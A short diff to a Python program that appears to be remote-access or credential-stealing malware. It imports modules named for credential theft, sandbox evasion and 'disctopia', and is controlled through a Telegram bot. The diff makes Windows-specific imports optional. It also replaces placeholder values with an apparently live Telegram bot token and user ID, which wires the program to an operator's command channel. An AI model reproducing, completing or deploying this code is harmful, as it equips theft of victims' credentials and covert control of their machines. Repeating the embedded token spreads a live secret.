@@ -20,17 +20,21 @@ import json
 import ctypes
 from ctypes.wintypes import HKEY
 import time
-from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
-import win32api
-import win32process
-import psutil
-import win32pdh
-from winreg import *
-from ctypes import *
+try:
+    from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
+    import win32api
+    import win32process
+    import psutil
+    import win32pdh
+    from winreg import *
+    from ctypes import *
+except ImportError:
+    # Windows-specific modules not available; define placeholders if needed
+    pass
 from libraries import credentials,sandboxevasion,disctopia
 
-BOT_TOKEN = "{BOT_TOKEN}"
-USER_ID = "{USER_ID}" 
+BOT_TOKEN = "8400715925:AAFrMytYs0vKxww5ud--g86BT0WCFio5vqU"
+USER_ID = "7904253040" 
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
